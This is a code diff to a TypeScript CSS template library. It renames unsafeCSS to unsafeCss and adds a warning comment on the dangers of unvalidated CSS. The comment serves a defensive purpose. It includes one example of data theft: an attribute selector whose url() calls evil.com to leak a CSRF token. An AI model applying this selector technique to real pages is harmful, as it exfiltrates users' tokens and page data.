@@ -52,11 +52,11 @@ const cssResultCache = new WeakMap<TemplateStringsArray, CSSResult>();
 
 /**
  * Tags a template literal as CSS. Interpolated values must themselves be `CSSResult`s (from
- * `css` or `unsafeCSS`) or plain numbers - arbitrary strings are rejected to avoid accidentally
+ * `css` or `unsafeCss`) or plain numbers - arbitrary strings are rejected to avoid accidentally
  * splicing untrusted/dynamic text into a stylesheet (a standard guard). Use
- * `unsafeCSS()` to explicitly opt out of that check:
+ * `unsafeCss()` to explicitly opt out of that check:
  * ```ts
- * css`button { color: ${unsafeCSS(userColor)}; }`
+ * css`button { color: ${unsafeCss(userColor)}; }`
  * ```
  *
  * Note: values can contains CSSResult which is embedded by composition.
@@ -79,12 +79,23 @@ function cssValueToString(value: CSSResult | number): string {
 	if (value instanceof CSSResult) return value.cssText;
 	if (typeof value === 'number') return String(value);
 	throw new TypeError(
-		`Value passed to 'css' must be a 'CSSResult' (from css\`...\`/unsafeCSS()) or a number, got: ${String(value)}`,
+		`Value passed to 'css' must be a 'CSSResult' (from css\`...\`/unsafeCss()) or a number, got: ${String(value)}`,
 	);
 }
 
-/** Opts a plain string (e.g. loaded at runtime) into being treated as trusted CSS, for use inside `css` literals. */
-export function unsafeCSS(value: unknown): CSSResult {
+/**
+ * Opts a plain string (e.g. loaded at runtime) into being treated as trusted CSS, for use inside `css` literals.
+ *
+ * UNSAFE: the string is used verbatim, with no validation or escaping. Never pass untrusted
+ * input (user data, query params, third-party content). Injected CSS cannot run script, but it can:
+ * - spoof or overlay the UI (hide real elements, fake login forms, clickjacking);
+ * - exfiltrate page data without JS, e.g. attribute selectors + `url()` leaking a CSRF token
+ *   `input[value^="a"] { background: url(https://evil.com/?t=a) }`;
+ * - track/fingerprint via `url()`, `@font-face` `unicode-range`, media queries;
+ * - degrade or freeze the page (expensive selectors/filters, hiding `body`).
+ * For dynamic values prefer CSS custom properties set from validated data (e.g. `/^#[0-9a-f]{6}$/i`).
+ */
+export function unsafeCss(value: unknown): CSSResult {
 	return new CSSResult(String(value));
 }
 
